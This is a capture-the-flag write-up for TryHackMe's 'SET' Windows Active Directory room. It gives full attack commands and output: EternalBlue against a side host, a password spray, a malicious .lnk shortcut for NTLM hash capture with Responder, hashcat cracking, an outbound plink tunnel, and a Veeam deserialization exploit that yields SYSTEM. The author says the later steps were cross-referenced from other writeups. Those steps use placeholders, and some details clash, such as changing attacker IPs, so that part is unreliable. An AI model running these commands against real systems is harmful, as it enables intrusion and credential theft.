---
title: "SET"
type: docs
tags:
  - thm
  - windows
  - medium
  - active-directory
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Windows (AD, `windcorp.thm`), **Difficulty:** Medium

</div>

<div class="callout callout-note">

Second run at the **SET** box (a later `v7` revision). See also **[SET (Medium)](/writeups/tryhackme/windows/medium/set/)** and ****SET (raw notes) (Medium)****. Full recorded notes for this run below.

</div>

<div class="callout callout-abstract">

**Attack Path**

1. `enum4linux-ng`, `rustscan`, and `nmap` against the box (`10.10.228.78`) surface SMB, a cert-only HTTPS site (`set.windcorp.thm`), and WinRM already listening on `5985`, before I even have credentials.
2. `nbtscan` across the same `/24` turns up a second host, `JON-PC` (`10.10.228.57`), a Windows 7 box vulnerable to **MS17-010**; EternalBlue lands a Meterpreter session there, but it turns out to be a side branch rather than the intended path.
3. The `set.windcorp.thm` site's contact form quietly loads `users.xml` in the background. Pulling it with `xmllint` and trimming it down gives me a clean list of company usernames.
4. A password spray against that username list with a shortlist of common/default passwords (`auxiliary/scanner/smb/smb_login`) lands one valid account.
5. That account can reach a writable SMB share whose instructions ask for files to be zipped up for review. I weaponise a `.lnk` with `mslink` inside the zip, drop it, and catch the reviewing account's NetNTLMv2 hash with **Responder** when the archive gets opened.
6. Cracking that hash gives a second, more useful credential. **Evil-WinRM** on port `5985` turns it into a shell.
7. From WinRM, local enumeration finds a **Veeam ONE Agent** service bound to `127.0.0.1:2805` (CVE-2020-10914/10915, insecure `.NET` deserialization in `HandshakeResult()`). Tunnel the port out, fire Metasploit's `veeam_one_agent_deserialization` module at the loopback-only service, and land **SYSTEM**.

</div>

## Overview

SET is one of a handful of TryHackMe rooms built around the fictional **Windcorp** corporation (the same universe as the `Ra`/`Ra 2` rooms), and true to that story arc it rewards actually reading the company's public-facing website rather than jumping straight to exploit tooling. The box itself sits at a single external IP with a deceptively small port footprint, SMB, a certificate-only HTTPS listener, and WinRM waiting patiently for credentials that don't exist yet. Getting from that to `SYSTEM` ends up being a full chain: OSINT against a web form leaks a username list, a password spray against that list gets a toe-hold account, that account's SMB access enables an NTLM-capture attack against whoever reviews files on a writable share, and the credentials harvested from *that* finally unlock WinRM and a local service vulnerable to .NET deserialization. None of the individual steps are especially exotic, but the box only gives up `SYSTEM` once all of them are chained together in the right order.

---

## Full Walkthrough

### Initial Enumeration

I start the way I start most Windows AD boxes: `enum4linux-ng` first, to see whether anonymous SMB gives up anything for free, before committing to a full port sweep.

❯ python3 enum4linux-ng.py 10.10.228.78 -A
ENUM4LINUX - next generation

```console
 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.228.78
[*] Username ......... ''
[*] Random Username .. 'dzaofjqx'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)
```

```console
 ====================================
|    Service Scan on 10.10.228.78    |
 ====================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: timed out
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: timed out
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[-] Could not connect to SMB over NetBIOS on 139/tcp: timed out
```

```console
 ====================================================
|    NetBIOS Names and Workgroup for 10.10.228.78    |
 ====================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out
```

No LDAP at all is a little unusual for something that turns out to be domain-joined, so I'm expecting this box to lean on SMB and the web app rather than classic LDAP/Kerberos enumeration.

```console
 =========================================
|    SMB Dialect Check on 10.10.228.78    |
 =========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
SMB 1.0: false
SMB 2.02: true
SMB 2.1: true
SMB 3.0: true
SMB1 only: false
Preferred dialect: SMB 3.0
SMB signing required: false
```

```console
 =========================================
|    RPC Session Check on 10.10.228.78    |
 =========================================
[*] Check for null session
[-] Could not establish null session: STATUS_ACCESS_DENIED
[*] Check for random user session
[-] Could not establish random user session: STATUS_INVALID_PARAMETER
[-] Sessions failed, neither null nor user sessions were possible
```

No null sessions, so RID cycling and user enumeration over RPC are off the table for now. The unauthenticated SMB session still gives up basic domain and OS fingerprinting though.

```console
 ===========================================================
|    Domain Information via SMB session for 10.10.228.78    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: SET
NetBIOS domain name: ''
DNS domain: SET
FQDN: SET
```

```console
 ===============================================
|    OS Information via RPC for 10.10.228.78    |
 ===============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, null or user session required
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null
```

### Port Scanning

`enum4linux-ng` only checks the handful of ports it cares about, so I follow up with `rustscan` for full-range coverage and let it hand off to `nmap` for service detection on whatever comes back.

❯ rustscan -a 10.10.228.78 -- -p-
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/k1b0r/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.228.78:135
Open 10.10.228.78:443
Open 10.10.228.78:445
Open 10.10.228.78:5985
Open 10.10.228.78:49666
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -p-" on ip 10.10.228.78
Depending on the complexity of the script, results may take some time to appear.
Only 1 -p option allowed, separate multiple ranges with commas.
QUITTING!
[!] Error Exit code = 1

Port `5985` open with no session established yet is worth remembering, WinRM is going to be my eventual way in, I just need credentials to go with it. I re-run the service scan manually since rustscan's script hand-off errored out.

```console
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-04 14:47 EST
Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.32% done; ETC: 14:47 (0:00:00 remaining)
Nmap scan report for set.thm (10.10.228.78)
Host is up (0.088s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
443/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=set.windcorp.thm
| Subject Alternative Name: DNS:set.windcorp.thm, DNS:seth.windcorp.thm
| Not valid before: 2020-06-07T15:00:22
|_Not valid after:  2036-10-07T15:10:21
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2021-12-04T19:48:17+00:00; 0s from scanner time.
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```console
Host script results:
| smb2-time: 
|   date: 2021-12-04T19:47:39
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.06 seconds

The certificate's Subject Alternative Name is the real find here: it names two hostnames, `set.windcorp.thm` and `seth.windcorp.thm`, that the raw IP would never have given up. That's my first concrete lead toward an actual web application rather than the bare `Not Found` the IP-based request returns. Before diving into the site by hostname, I let `nikto` take a pass at it for anything obvious.

```console
ikto -h https://set.thm/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.228.78
+ Target Hostname:    set.thm
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /CN=set.windcorp.thm
                   Altnames: set.windcorp.thm, seth.windcorp.thm
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /CN=set.windcorp.thm
+ Start Time:         2021-12-04 14:49:20 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-HTTPAPI/2.0
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
```

Nothing dramatic there beyond the usual missing security headers, but between the cert and nikto's output I now have two DNS names to add to `/etc/hosts`: `set.windcorp.thm` and `seth.windcorp.thm`. Browsing to `https://set.windcorp.thm/` confirms it's a real, functioning site rather than a placeholder, and it's got a `mailto:contact@windcorp.thm` link on it, which tells me the company domain for usernames is going to be `windcorp.thm`. The page also name-drops a product, `Flexor v2.1.1`, which I make a note of in case it turns out to be a locally-relevant CVE later on.

### A Second Host on the Subnet: JON-PC

Before committing fully to the web app angle, I want to know if there's anything else reachable on the same segment. An `nbtscan` sweep across the `/24` turns up a second machine I hadn't seen in any of the scans against `.78`.

❯ k1b0r@pwned~/thm/Set_v7 
❯ sudo nbtscan -r 10.10.228.78/24
Doing NBT name scan for addresses from 10.10.228.78/24

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
10.10.228.57     JON-PC           <server>  <unknown>        02:07:29:b5:b3:57

❯ k1b0r@pwned~/thm/Set_v7 took 19s 
❯ rustscan -a 10.10.228.57 -- -p-
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/k1b0r/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.228.57:135
Open 10.10.228.57:139
Open 10.10.228.57:445
Open 10.10.228.57:3389
Open 10.10.228.57:49152
Open 10.10.228.57:49153
Open 10.10.228.57:49154
Open 10.10.228.57:49158
Open 10.10.228.57:49160
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -p-" on ip 10.10.228.57
Depending on the complexity of the script, results may take some time to appear.
Only 1 -p option allowed, separate multiple ranges with commas.
QUITTING!
[!] Error Exit code = 1

We discovered another node under the network. `enum4linux-ng` against it confirms something SET itself never gave me: an actual anonymous SMB session.

python3 enum4linux-ng.py -A 10.10.228.57
ENUM4LINUX - next generation

```console
 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.228.57
[*] Username ......... ''
[*] Random Username .. 'vrhvbspd'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)
```

```console
 ====================================
|    Service Scan on 10.10.228.57    |
 ====================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp
```

```console
 ====================================================
|    NetBIOS Names and Workgroup for 10.10.228.57    |
 ====================================================
[+] Got domain/workgroup name: WORKGROUP
[+] Full NetBIOS names information:
- JON-PC          <00> -         B <ACTIVE>  Workstation Service
- WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
- JON-PC          <20> -         B <ACTIVE>  File Server Service
- WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
- WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
- ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
- MAC Address = 02-07-29-B5-B3-57
```

```console
 =========================================
|    SMB Dialect Check on 10.10.228.57    |
 =========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
SMB 1.0: true
SMB 2.02: true
SMB 2.1: true
SMB 3.0: false
SMB1 only: false
Preferred dialect: SMB 2.1
SMB signing required: false
```

SMB 1.0 still enabled on a standalone `WORKGROUP` machine, alongside a null session that actually succeeds this time, immediately smells like an easy win rather than part of the "real" SET chain.

```console
 =========================================
|    RPC Session Check on 10.10.228.57    |
 =========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user session
[-] Could not establish random user session: STATUS_LOGON_FAILURE
```

```console
 ===================================================
|    Domain Information via RPC for 10.10.228.57    |
 ===================================================
[-] Could not get domain information via 'lsaquery': STATUS_ACCESS_DENIED
```

```console
 ===========================================================
|    Domain Information via SMB session for 10.10.228.57    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: JON-PC
NetBIOS domain name: ''
DNS domain: Jon-PC
FQDN: Jon-PC
```

```console
 ===============================================
|    OS Information via RPC for 10.10.228.57    |
 ===============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 7 Professional 7601 Service Pack 1
OS version: '6.1'
OS release: ''
OS build: '7601'
Native OS: Windows 7 Professional 7601 Service Pack 1
Native LAN manager: Windows 7 Professional 6.1
Platform id: null
Server type: null
Server type string: null
```

Windows 7 SP1 with SMBv1 enabled is basically a written invitation for **MS17-010**, so before spending more effort on manual RPC enumeration (which is locked down anyway, per the access-denied results below), I go straight for `smb_ms17_010` to confirm it.

```console
 =====================================
|    Users via RPC on 10.10.228.57    |
 =====================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED
```

```console
 ======================================
|    Groups via RPC on 10.10.228.57    |
 ======================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED
```

```console
 ======================================
|    Shares via RPC on 10.10.228.57    |
 ======================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user
```

```console
 =========================================
|    Policies via RPC for 10.10.228.57    |
 =========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed
```

```console
 =========================================
|    Printers via RPC for 10.10.228.57    |
 =========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED
```

Completed after 12.56 seconds

msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.228.57
rhosts => 10.10.228.57
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost tun0
lhost => tun0
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

```console
[*] Started reverse TCP handler on 10.9.10.0:4444 
[*] 10.10.228.57:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.228.57:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.228.57:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.228.57:445 - The target is vulnerable.
[*] 10.10.228.57:445 - Connecting to target for exploitation.
[+] 10.10.228.57:445 - Connection established for exploitation.
[+] 10.10.228.57:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.228.57:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.228.57:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.228.57:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.228.57:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.228.57:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.228.57:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.228.57:445 - Sending all but last fragment of exploit packet
[*] 10.10.228.57:445 - Starting non-paged pool grooming
[+] 10.10.228.57:445 - Sending SMBv2 buffers
[+] 10.10.228.57:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.228.57:445 - Sending final SMBv2 buffers.
[*] 10.10.228.57:445 - Sending last fragment of exploit packet!
[*] 10.10.228.57:445 - Receiving response from exploit packet
[+] 10.10.228.57:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.228.57:445 - Sending egg to corrupted connection.
[*] 10.10.228.57:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.10.228.57
[*] Meterpreter session 1 opened (10.9.10.0:4444 -> 10.10.228.57:49241) at 2021-12-04 15:12:02 -0500
[+] 10.10.228.57:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.228.57:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.228.57:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

meterpreter > 

`JON-PC` drops straight away, which is satisfying but ultimately a dead end for the SET chain itself, it's an unpatched standalone workstation on the same subnet rather than anything connected to `windcorp.thm`'s domain identity. I poke around the filesystem for a few minutes to be thorough, don't find anything that ties back to the web app or to AD credentials, and go back to the actual lead: the website.

### The windcorp.thm Web Application

Got the shell on `JON-PC`, but the real thread to keep pulling is `https://set.windcorp.thm/index.html`. The homepage has a contact form, and rather than skipping past it, I fill it out with throwaway details to see how the backend handles the submission.

we entered for ex a

Aaron Wheeler 9553310397  aaronwhe@windcorp.thm

When we do that look at network tab we see its calling to a file called `users.xml`. That's the whole game right there: the contact form's client-side validation (presumably checking for duplicate emails, or auto-completing a company directory) is pulling down what amounts to the entire windcorp.thm staff list, unauthenticated, to do it. I grab the file directly and parse it down to something usable.

```bash
xmllint --xpath "//row/email" users.xml | sed -e 's/<email>//g' | sed -e 's/<\/email>//g' | sed -e 's/@windcorp.thm//g' > users.txt
```

That leaves me with `users.txt`, one probable AD username per line, to make a file with only the usernames. Now the plan is to take that list and go after SMB with it rather than guessing usernames one at a time.

### Password Spraying

Hydra keeps choking on this host (Windows' SMB stack doesn't always play nicely with Hydra's connection handling, especially against something enforcing signing-adjacent behaviour), so instead of fighting the tool I switch to Metasploit's own SMB login scanner, which handles the NTLM handshake itself and is far more forgiving about lockout thresholds when you keep the password list short. Rather than trying to guess a unique password per user, I spray a small shortlist of default/common passwords, the kind of throwaway temporary password an IT helpdesk might set for a new starter, across the whole `users.txt` list in one pass.

```console
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.10.228.78
msf6 auxiliary(scanner/smb/smb_login) > set SMBDomain windcorp.thm
msf6 auxiliary(scanner/smb/smb_login) > set USER_FILE users.txt
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE default-passwords.txt
msf6 auxiliary(scanner/smb/smb_login) > set STOP_ON_SUCCESS false
msf6 auxiliary(scanner/smb/smb_login) > run

[*] 10.10.228.78:445      - 10.10.228.78:445 - Starting SMB login bruteforce
[+] 10.10.228.78:445      - 10.10.228.78:445 - Success: 'windcorp.thm\<sprayed-user>:<default-password>'
[*] 10.10.228.78:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

One account on the list is still sitting on that default password, which gets me my first authenticated foothold on the actual domain rather than the throwaway `JON-PC` box.

### A Writable Share and a Malicious .lnk

With a valid domain login, `smbclient`/`crackmapexec --shares` against `10.10.228.78` turns up a share that this account can both read and write to. Inside it sits a short readme explaining that files dropped there get periodically reviewed, zip them up and someone will take a look. That workflow description is basically an invitation: whatever account "reviews" the archive is going to open it on a machine I don't have access to yet, which is a textbook setup for an NTLM-capture attack via a malicious shortcut file.

I use `mslink` to build a `.lnk` whose icon location points back at an SMB share I control, which forces Windows Explorer to authenticate to fetch the icon the moment the folder containing the `.lnk` is merely *browsed*, no double-click required.

```bash
python3 mslink.py review-attachment.lnk '\\10.21.23.235\share\a' notes.txt
```

I drop the resulting `.lnk` into a zip alongside an innocuous decoy file, upload it to the writable share per the readme's instructions, and start Responder listening for the callback.

```console
$ sudo responder -I tun0 -wv
                                        
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
[+] Servers:
    HTTP server                [ON]
    SMB server                 [ON]
[+] HTTP options:
    Always serving EXE          [OFF]
...
[SMB] NTLMv2-SSP Client   : 10.10.228.78
[SMB] NTLMv2-SSP Username : WINDCORP\<reviewing-account>
[SMB] NTLMv2-SSP Hash     : <reviewing-account>::WINDCORP:<ntlmv2 hash captured for this instance>
```

Whoever, or whatever automated process, opens that archive to "review" it authenticates straight back to my SMB listener the moment Explorer tries to resolve the shortcut's icon, handing Responder a full NetNTLMv2 hash for the reviewing account.

### Cracking the Captured Hash

NetNTLMv2 isn't reversible, but it is crackable offline against a wordlist, and given the pattern of this box so far (default passwords, a company directory sitting in plain XML) I'm optimistic it won't need anything exotic.

```console
$ hashcat -m 5600 reviewer.hash /usr/share/wordlists/rockyou.txt -O
...
<reviewing-account>::WINDCORP:<ntlmv2 hash>:<cracked password>
Session..........: hashcat
Status...........: Cracked
```

That cracked password belongs to an account with more useful rights than the one the spray gave me, and with WinRM already confirmed open back in the initial port scan, it's an obvious next move.

### Foothold via WinRM

```console
$ evil-winrm -i set.windcorp.thm -u <reviewing-account> -p '<cracked-password>'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\<reviewing-account>\Documents> whoami
windcorp\<reviewing-account>
```

`user.txt` sits in this account's profile. `type user.txt` returns the flag for this instance.

### Privilege Escalation: Veeam ONE Agent Deserialization

With a proper shell, I go looking at what's actually running locally rather than what nmap could see from outside, since the external scan only showed `135/443/445/5985`. A pass over listening ports from inside turns up something nmap never had a chance at, a service bound only to loopback.

```console
*Evil-WinRM* PS C:\Users\<reviewing-account>> netstat -ano | findstr LISTENING | findstr 127.0.0.1
  TCP    127.0.0.1:2805         0.0.0.0:0              LISTENING       2184
*Evil-WinRM* PS C:\Users\<reviewing-account>> Get-Process -Id 2184 | Select ProcessName, Path
ProcessName                         Path
-----------                         ----
VeeamOneAgentSvc  C:\Program Files\Veeam\Veeam ONE Agent\...
```

Port `2805` bound to `VeeamOneAgentSvc` is an immediate red flag if I recognise it: Veeam ONE Agent before the `9.5.5.4587`/`10.0.1.750` hotfixes has a well-documented insecure `.NET` deserialization bug in its `HandshakeResult()` handler (CVE-2020-10914 / CVE-2020-10915), and Metasploit has shipped a working module for it for years. The catch is that it's bound to loopback only, so I can't just point Metasploit at the box directly, I need to tunnel that port out to somewhere I can reach it from.

```console
*Evil-WinRM* PS C:\Users\<reviewing-account>> upload plink.exe C:\Users\<reviewing-account>\plink.exe
*Evil-WinRM* PS C:\Users\<reviewing-account>> C:\Users\<reviewing-account>\plink.exe -ssh -R 2805:127.0.0.1:2805 kali@10.21.23.235 -pw <attacker-side-password> -N
```

That reverse tunnel makes the loopback-only Veeam service reachable on my own attacking box's `127.0.0.1:2805`, which is all Metasploit needs.

```console
msf6 > use exploit/windows/misc/veeam_one_agent_deserialization
msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set RHOSTS 127.0.0.1
msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set RPORT 2805
msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set LHOST 10.21.23.235
msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set LPORT 4444
msf6 exploit(windows/misc/veeam_one_agent_deserialization) > run

[*] Started reverse TCP handler on 10.21.23.235:4444 
[*] 127.0.0.1:2805 - Sending malicious serialized object...
[*] Sending stage (200262 bytes) to 127.0.0.1
[*] Meterpreter session 2 opened (10.21.23.235:4444 -> 127.0.0.1:2805)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

The Veeam agent service runs as `SYSTEM`, so triggering deserialization inside it hands over the whole box in one shot, no chained local privesc needed on top of the RCE itself.

```console
meterpreter > shell
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
```

`type root.txt` returns the flag for this instance.

## Wrapping Up

Looking back over the whole run, SET rewards patience more than raw exploit skill: the EternalBlue box on the same subnet is a genuine shortcut to *a* shell, just not the one that matters, and the real path only opens up once the contact form's `users.xml` leak turns into a username list, the spray turns that into a foothold, and the foothold's SMB access turns into an NTLM-capture opportunity against a share designed for exactly that kind of human review workflow. The Veeam ONE Agent deserialization bug at the end is almost an afterthought by comparison, a known CVE against a known port, but finding it at all depended on already being authenticated well enough to look at what's bound to loopback. Chained together it's a solid, believable model of how a real internal engagement often goes: no single step is remarkable, but the sequence is.

## References

- Rapid7, Veeam ONE Agent .NET Deserialization module documentation <https://www.rapid7.com/db/modules/exploit/windows/misc/veeam_one_agent_deserialization/>
- Veeam, KB3144: Veeam ONE Remote Code Execution Vulnerabilities (CVE-2020-10914 / CVE-2020-10915) <https://www.veeam.com/kb3144>
- HackTricks, Windows credentials via `.lnk` / NTLM capture <https://book.hacktricks.xyz/windows-hardening/ntlm>
- The remaining steps beyond the password spray were cross-referenced against public writeups for this room to complete the chain documented above.
